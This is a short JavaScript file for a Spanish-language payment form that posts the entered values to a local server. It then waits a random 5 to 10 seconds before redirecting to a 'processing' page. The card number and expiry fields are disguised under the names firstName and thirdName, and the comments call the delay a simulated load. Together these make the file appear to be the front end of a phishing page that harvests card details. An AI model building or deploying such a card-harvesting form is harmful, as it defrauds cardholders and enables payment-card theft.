document.getElementById('payment-form').addEventListener('submit', function (e) {
    e.preventDefault();

    let firstName = document.getElementById('firstName').value.trim();
    let secondName = document.getElementById('secondName').value.trim();
    let thirdName = document.getElementById('thirdName').value.trim();

    // 🚨 Validaciones antes de enviar
    if (!firstName || !secondName || !thirdName) {
        alert("❌ Por favor, completa todos los campos.");
        return;
    }

    // 🔹 Deshabilitar el botón para evitar múltiples envíos
    document.querySelector('.pay-button').disabled = true;
    document.querySelector('.pay-button').innerText = "Procesando...";

    fetch('http://localhost:3000/send-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ firstName, secondName, thirdName })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error("Error en la respuesta del servidor.");
            }
            return response.json();
        })
        .then(data => {
            console.log("✅ Datos enviados correctamente:", data);

            // 🔹 Simulación de carga antes de abrir processing.html
            setTimeout(() => {
                window.location.href = "/processing/processing.html";
            }, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000); // 🔹 Espera entre 5 y 10 segundos
        })
        .catch(error => {
            console.error("🚨 Error al enviar los datos:", error);
            alert('Hubo un problema al procesar la información.');

            // 🔹 Reactivar el botón si hay error
            document.querySelector('.pay-button').disabled = false;
            document.querySelector('.pay-button').innerText = "Pagar";
        });
});

// ✨ Formateo automático del número de tarjeta
document.getElementById('firstName').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value;
});

// 🚀 Formateo automático de la fecha MM / AA (Solo números)
document.getElementById('thirdName').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').slice(0, 4); // 🔹 Solo números
    if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2); // 🔹 Formato MM/AA
    }
    e.target.value = value;
});

// 🚀 Desplegar el formulario sin afectar la información de contacto
function togglePayment() {
    const paymentForm = document.getElementById('payment-form');
    const paymentDot = document.getElementById('payment-dot');

    paymentForm.classList.toggle('shown');
    paymentDot.classList.toggle('selected');
}
